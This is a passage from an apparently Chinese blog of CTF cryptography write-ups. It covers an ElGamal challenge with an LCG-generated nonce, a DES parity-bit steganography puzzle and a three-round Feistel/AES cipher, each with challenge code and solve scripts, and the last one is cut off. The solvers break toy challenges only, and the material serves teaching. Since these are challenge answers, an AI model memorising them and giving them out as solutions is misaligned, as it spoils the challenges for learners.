class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><br>size = <span class="hljs-number">2048</span><br>rand_state = getRandomInteger(size // <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>(<span class="hljs-params">size</span>):<br>    q = getPrime(size)<br>    k = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = q * k + <span class="hljs-number">1</span>  <span class="hljs-comment">#p=q*k+1(k&gt;=2)</span><br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br>    g = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(g, q, p) == <span class="hljs-number">1</span>:<span class="hljs-comment">#g^q(mod p)==1</span><br>            <span class="hljs-keyword">break</span><br>        g += <span class="hljs-number">1</span><br>    A = getRandomInteger(size) % q<br>    B = getRandomInteger(size) % q<br>    x = getRandomInteger(size) % q<br>    h = <span class="hljs-built_in">pow</span>(g, x, p)<span class="hljs-comment">#x=g^x(mod p)</span><br>    <span class="hljs-keyword">return</span> (g, h, A, B, p, q), (x,)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">A, B, M</span>):<br>    <span class="hljs-keyword">global</span> rand_state<br>    rand_state, ret = (A * rand_state + B) % M, rand_state<br>    <span class="hljs-keyword">return</span> ret<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">pubkey, m</span>):<br>    g, h, A, B, p, q = pubkey<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt; m &lt;= p<br>    r = rand(A, B, q)<br>    c1 = <span class="hljs-built_in">pow</span>(g, r, p)<br>    c2 = (m * <span class="hljs-built_in">pow</span>(h, r, p)) % p<br>    <span class="hljs-keyword">return</span> (c1, c2)<br><br>pubkey, privkey = keygen(size)<br><br>m = bytes_to_long(flag)<br>c1, c2 = encrypt(pubkey, m)<br>c1_, c2_ = encrypt(pubkey, m)<br><br><span class="hljs-built_in">print</span>(pubkey)<br><span class="hljs-built_in">print</span>(c1, c2)<br><span class="hljs-built_in">print</span>(c1_, c2_)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(31, 2903872469452488232986082068970226363415249959753378127387340761558322947639538599416192597355051658321566151741881194691696679168562652851558454508586292381627532388109473859122030135884451595628904457634573033291420254594266091011569983499242061588402663179825401113594316050281129006824654605494313134635200383113785606604910984260714384466745998802352797702964187607460251409162795158473649023421027048019664621622654409343071354878400874934077520718175489387053488203870142307859581912322377496646060389536944623880388672276230588990337309373313105076326414289832865708792424499854875995846595431779706352520990711, 8019972739073167822630693222165049486863053294239837836148297465278914117496192117088374921834942737132099609558194735199234984358622358872664536940693928819931141438095769624613084803588375508624046867957721510964055370940598926179581069651827581771089394975934872070388631835804500885118544678494182379542854166383671302359882010727961440139987743321736969290648105524789283162142900680614031452678425892228568496077220233867835907128092839577198223236014809602623031523939244404829788559178977835020866935852972952770588057054292893857932058528041142676050003445584592827145682582657983489609948220784454885977667, 13098119870841671935561170697218875517467113926219834445345731531009526482247383198833125606781984989912639538435769366041813769591860375012408393808930148074723337259705075406599470364040554594361674330527667655772052472226616152463143798843925050951073302704011610451609952210028360999320983954059903471582313091087194490127912204294310600338740882919523893245000595982545966765969559377222036611893321793470096563338828844070486584588943939153875618086468732271963959977696447434211119540028846645837854460330114437259736948326376630283889820029433932014525483459669211399112558902960950699183147200420600513496035, 3710216773807132974684350382287036374484712290493089717256645010606985371865014260005583007342763751707832053852912399035995265293773402655185363238714480200691439587489379990919670943652817445443618356430972882365639065894917852120292441275070760121269037628177268880900615682734906221916048486033862669671164005301215479043496789892786707672429990365474503677201463381101808733444081365043633983516327545780678821056956945356874407912666841368806955634949342760918508324256861837894969319300252447901727553533037227778026297138696428476398966772280297900909791430021732918245750220732313285207015204452637322972768963, 16712688170302400786866443163455118803985190497716620348002905453184618792184748918944067600643079962647892134472578374036014708530510822771105239814029190093204682826528738697836355602039718222719001605544922893538914711238368703244560546284102523068779448775573283247300070642950028026648867054206588602122360384239709365060796350868408593119054010655290557104511096311269408709207573716412765691514988944958012707463770024130064900507508294454085385743015057481614902361517395666193555492343479495052826817716383908910028365489623551695490841316577918472566628063160959091197073066361771554986554975011879833210671)</span><br><span class="hljs-string">(3100349483524274653022384928200635737753422986289159820424019040444144691644690052669109350930621579860105090557982045963207102171094362042827411082497163217086274287594613748107537848834982648700333377592738187890218016528344272981796762903740797716504573536887937208793800020156311510340992287904358151414702006513853886010726646705208895621214575899893842519158143686891308965698866819306938691897369906191668699904197058522061615171977664399340272720679054856013709607376322485017513581277665000697806851508418361229341678496284111817539269000452848289240894830355606498506071756606493222627340334527293810043438985, 1630362723294004337626986483370584180482483528766099828778465514030818880615101649126188326175505074431211195371451996117421558133473821876416589819212910322315645795579075826682700343573096809616171751725226366160254952492860679799592338583045176787799246735506683778654781309872960453078016776737986103129645791537053503175608583035580417538999744929704226741725280705705065920809173501670923168779285065749725160330604470700298380024200813563541501623857960537212758841719424638789290952674368138948692559490973323287068158433865978664857454020387894451387253121556130795562865545006349663196589787534952075625732202)</span><br><span class="hljs-string">(2787449217518245154298404871823161875426836309049009959351295018902689406922914317483397839292682803411445902204831312950087295291534257448122873510340721549285266152160637116569568251644080399285373100888905209378937516639368318483638973620250141555899566449820585351563377242987508802710916562147797776182869955605585602283101367128738750771530368584800206562289781142483654093735032060337706689889241531969190459308025182737949802906974188851549008265672475449831433309881288431486914638048569711334327859096480120115392407745656930475892412923022011200591303698844390955663387336709889516004453061661157871904014911, 3005853189385011339804478250186447059667805759261350490691509782748636212653501060690989929203741122499389064483623905491758420966783686421876733095325076227364850805021089835482434774299003712308046939868350158148489041469150601688064374719854409117475278310054252108986889140277649456773735403619247002735895400514151568120966945752389980751638919458770429114771659719318676088290680989666451080768830656728083135050093138704160885654010701796913141893833325345006734702327653403125675379489935319673434818472510443435102504877403245382560249661206546157088260868986826793324410060615805891042202943220098530856133502)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>可以看出，该算法就是一个 ElGamal 加密，给了同一个明文两组加密后的结果，其特点在于使用的随机数 r 是通过线性同余生成器生成的，则可知道</p><script type="math/tex; mode=display">c2 \equiv m * h^{r} \bmod p\\c2\_ \equiv m*h^{(Ar+B) \bmod q} \equiv m*h^{Ar+B}\bmod p</script><p>则</p><script type="math/tex; mode=display">c2^A*h^B/c2\_ \equiv m^{A-1}\bmod p</script><p>其中，c2，c2_，A，B，h 均知道。则可知道</p><script type="math/tex; mode=display">m^{A-1} \equiv t \bmod p</script><p>我们假设已知 p 的一个原根 g，则可以假设</p><script type="math/tex; mode=display">g^x \equiv t\\g^y \equiv m</script><p>则</p><script type="math/tex; mode=display">g^{y(A-1)}\equiv g^x \bmod p\\->y(A-1) \equiv x \bmod p-1</script><p>进而知道</p><script type="math/tex; mode=display">y(A-1)-k(p-1)=x</script><p>这里我们知道 A，p，x，则我们可以利用扩展欧几里得定理求得</p><script type="math/tex; mode=display">s(A-1)+w(p-1)=gcd(A-1,p-1)</script><p>如果gcd(A-1,p-1)=d，则我们直接计算</p><script type="math/tex; mode=display">t^s \equiv m^{s(A-1)} \equiv m^d \bmod p</script><p>如果d=1,那么t^s%p就是m,但是求出来d=2,这里m只有42bit,平方后也没有超过p的位数，所以对t^s%p开发就能求出来</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./output.txt&#x27;</span>).read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>g, h, A, B, p, q = <span class="hljs-built_in">eval</span>(data[<span class="hljs-number">0</span>])<br><br>c1, c2 = <span class="hljs-built_in">eval</span>(data[<span class="hljs-number">1</span>])<br>c1_, c2_ = <span class="hljs-built_in">eval</span>(data[<span class="hljs-number">2</span>])<br><br>tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)<br>tmp = tmp % p<br><br><span class="hljs-comment">#print(&#x27;t=&#x27;, tmp)</span><br><span class="hljs-comment">#print(&#x27;A=&#x27;, A)</span><br><span class="hljs-comment">#print (&#x27;p=&#x27;, p)</span><br>gg, x, y = gmpy2.gcdext(A - <span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br><span class="hljs-comment">#print(gg)</span><br><br>m = gmpy2.powmod(tmp, x, p)<br>mm=gmpy2.iroot(m, gg)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(mm))<br><span class="hljs-comment">#print(hex(m)[2:].decode(&#x27;hex&#x27;))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-Lab4</title>
    <link href="/post/Crypto-Lab4.html"/>
    <url>/post/Crypto-Lab4.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab4"><a href="#Crypto-Lab4" class="headerlink" title="Crypto-Lab4"></a>Crypto-Lab4</h1><h2 id="1-DES-KEY"><a href="#1-DES-KEY" class="headerlink" title="1.DES KEY"></a>1.DES KEY</h2><p>描述：据说可以用不同的KEY来解密相同密文 DES Chipher: c0a9c41c840bb485</p><p>提示：DES的有效秘钥长度</p><p>真正的秘密被隐藏在了key中，也算是一种类似base64隐写的手段</p><p>题目给出的是秘钥的16进制格式，DES秘钥长度8字节</p><p>题目：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dns">ea5ddfc<span class="hljs-number">74345a485</span><br>ea5ddfc<span class="hljs-number">64245a584</span><br>ea5ddfc<span class="hljs-number">64345a484</span><br>ea5ddfc<span class="hljs-number">64244a485</span><br>ea5ddfc<span class="hljs-number">64245a585</span><br>ea5ddfc<span class="hljs-number">74344a585</span><br>ea5ddfc<span class="hljs-number">64245a484</span><br>ea5ddfc<span class="hljs-number">64245a484</span><br>ea5ddfc<span class="hljs-number">64244a485</span><br>ea5ddfc<span class="hljs-number">64244a584</span><br>ea5ddfc<span class="hljs-number">64244a485</span><br>ea5ddfc<span class="hljs-number">64244a585</span><br>ea5ddfc<span class="hljs-number">64245a484</span><br>ea5cdfc<span class="hljs-number">74244a585</span><br>ea5cdfc<span class="hljs-number">64345a485</span><br>ea5ddfc<span class="hljs-number">64244a585</span><br>ea5cdfc<span class="hljs-number">74244a484</span><br>ea5cdfc<span class="hljs-number">74344a485</span><br>ea5ddfc<span class="hljs-number">64244a584</span><br>ea5cdfc<span class="hljs-number">64345a485</span><br>ea5cdfc<span class="hljs-number">74245a484</span><br>ea5ddfc<span class="hljs-number">64244a584</span><br>ea5cdfc<span class="hljs-number">74245a585</span><br>ea5cdfc<span class="hljs-number">74245a585</span><br>ea5cdfc<span class="hljs-number">64345a485</span><br>ea5ddfc<span class="hljs-number">64244a584</span><br>ea5ddfc<span class="hljs-number">64245a485</span><br>ea5cdfc<span class="hljs-number">74245a584</span><br>ea5cdfc<span class="hljs-number">74344a485</span><br>ea5cdfc<span class="hljs-number">64345a485</span><br>ea5ddfc<span class="hljs-number">64245a584</span><br>ea5ddfc<span class="hljs-number">64245a484</span><br>ea5cdfc<span class="hljs-number">74245a485</span><br>ea5cdfc<span class="hljs-number">74244a584</span><br>ea5cdfc<span class="hljs-number">74244a585</span><br>ea5cdfc<span class="hljs-number">74245a485</span><br>ea5ddfc<span class="hljs-number">64244a584</span><br>ea5cdfc<span class="hljs-number">74244a585</span><br>ea5cdfc<span class="hljs-number">74245a585</span><br>ea5ddfc<span class="hljs-number">64244a584</span><br>ea5ddfc<span class="hljs-number">64245a584</span><br>ea5ddfc<span class="hljs-number">64245a484</span><br>ea5ddfc<span class="hljs-number">74345a485</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>根据提示，可以知道这些密钥都可以用于同一密文的解密，说明这些des密钥的56位有效位是相同的，用奇偶校验的8位隐藏了信息，数一下密钥数，有43个，一个能隐藏8bit数据（一个字节），而flag一般42字节所以能猜测应该是一个密钥隐写了一个字节的flag数据，把这些被隐写的二进制拉出来，转成字节形式即可</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;DES key.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).readlines()]<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#print(len(c))</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>a=<span class="hljs-string">&#x27;&#x27;</span><br>bb=<span class="hljs-built_in">bin</span>(c[i])[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    a+=bb[<span class="hljs-number">8</span>*j-<span class="hljs-number">1</span>]<br><span class="hljs-comment">#print(a)</span><br>res+=a<br>num=<span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(num))<br></code></pre></td></tr></table></figure><h2 id="2-Feistel"><a href="#2-Feistel" class="headerlink" title="2.Feistel"></a>2.Feistel</h2><p>描述：得到的结果请包上flag{}提交</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>sbox=[ <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>,<br>    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,<br>    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>,<br>    <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>,<br>    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>    <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,<br>    <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>,<br>    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,<br>    <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext, keystream</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(plaintext) == <span class="hljs-number">32</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(keystream) == <span class="hljs-number">48</span><br><br>    left = plaintext[:<span class="hljs-number">16</span>]<br>    right = plaintext[<span class="hljs-number">16</span>:]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        aes = AES.new(keystream[i * <span class="hljs-number">16</span>:i * <span class="hljs-number">16</span> + <span class="hljs-number">16</span>], AES.MODE_ECB)<br>        new_right = long_to_bytes(bytes_to_long(aes.encrypt(right)) ^ bytes_to_long(left))<br>        new_left = right<br>        left = new_left<br>        right = new_right<br>    <span class="hljs-keyword">return</span> left + right<br>key=<span class="hljs-string">b&#x27;Do_you_like_Feistel_I_like_AES_This_is_your_flag&#x27;</span><br>c=encrypt(flag,key)<br>c=[sbox[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(c).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#788a9b46b757c57fd10f915d1eac078d16c2e4137b17507ebc0df94de1b49f30</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>feistel轮结构如下</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212021637312.png" alt="image-20221202163703212"></p><p>一般完整的Feistel最后一轮的最后一步是不会交换的，为了保证加解密结构相同。</p><p>这一题是先对密文进行字节代换，然后直接进行了三轮加密</p><p>可以对密文进行逆字节代换，解密密钥与加密密钥顺序相反，进行feistel轮函数的解密。</p><p>加密：</p><script type="math/tex; mode=display">\begin{cases}L_1\equiv{R_0} \quad\qquad\\R_1\equiv{L_0\bigoplus{F(R_0,K_1)}}\quad\end{cases}</script><p>解密：</p><script type="math/tex; mode=display">\begin{cases}L_0\equiv{R_1\bigoplus{F(L_1,K_1)}} \quad\qquad\\R_0\equiv{L_1}\quad\end{cases}</script><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 